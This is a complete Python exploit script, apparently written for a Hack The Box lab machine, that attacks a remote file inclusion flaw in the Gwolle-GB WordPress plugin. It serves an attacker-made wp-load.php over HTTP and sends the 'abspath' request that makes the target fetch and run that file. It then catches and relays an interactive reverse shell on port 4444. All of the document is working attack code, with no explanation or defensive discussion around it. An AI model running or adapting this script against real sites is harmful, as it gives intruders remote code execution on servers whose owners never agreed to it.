#!/usr/bin/env python3
"""
Exploit runner for Gwolle-GB RFI (WordPress plugin)
1. Serves current directory on port 80 (hosts wp-load.php)
2. Listens for reverse shell on port 4444
3. Triggers the RFI via curl-style request
"""

import http.server
import socketserver
import threading
import socket
import subprocess
import time
import sys
import os

LHOST = "10.10.14.97"
RHOST = "tartarsauce.htb"
HTTP_PORT = 80
NC_PORT = 4444

TARGET_URL = (
    f"http://{RHOST}/webservices/wp/wp-content/plugins/gwolle-gb/"
    f"frontend/captcha/ajaxresponse.php?abspath=http://{LHOST}/"
)


def start_http_server():
    """Serve current directory on port 80."""
    handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("0.0.0.0", HTTP_PORT), handler) as httpd:
        print(f"[+] HTTP server listening on 0.0.0.0:{HTTP_PORT}")
        print(f"    Serving: {os.getcwd()}")
        httpd.serve_forever()


def start_listener():
    """nc -lvnp 4444 equivalent."""
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", NC_PORT))
    srv.listen(1)
    print(f"[+] Listening for reverse shell on 0.0.0.0:{NC_PORT}")

    conn, addr = srv.accept()
    print(f"[*] Connection received from {addr[0]}:{addr[1]}")
    print("[*] Shell ready — type commands (Ctrl+C to exit)\n")

    # Shuttle data between stdin/stdout and the socket
    import select

    try:
        while True:
            readable, _, _ = select.select([conn, sys.stdin], [], [], 1)
            for s in readable:
                if s is conn:
                    data = conn.recv(4096)
                    if not data:
                        print("\n[!] Connection closed.")
                        return
                    sys.stdout.write(data.decode(errors="replace"))
                    sys.stdout.flush()
                else:
                    cmd = sys.stdin.readline()
                    if not cmd:
                        return
                    conn.send(cmd.encode())
    except KeyboardInterrupt:
        print("\n[!] Exiting.")
    finally:
        conn.close()
        srv.close()


def trigger_rfi():
    """Send the HTTP request that triggers the RFI."""
    time.sleep(2)  # give servers a moment to start
    print(f"[+] Triggering RFI: {TARGET_URL}")

    import urllib.request
    try:
        req = urllib.request.Request(TARGET_URL)
        urllib.request.urlopen(req, timeout=5)
    except Exception as e:
        # Expected — the server may hang or error after including our payload
        print(f"[*] Trigger request finished ({e})")


def main():
    print(f"[*] Make sure wp-load.php (with your reverse shell) is in: {os.getcwd()}")
    print()

    # 1. HTTP server in background
    http_thread = threading.Thread(target=start_http_server, daemon=True)
    http_thread.start()

    # 2. Trigger RFI in background (after short delay)
    trigger_thread = threading.Thread(target=trigger_rfi, daemon=True)
    trigger_thread.start()

    # 3. Listener in foreground (blocks until shell or Ctrl+C)
    start_listener()


if __name__ == "__main__":
    main()
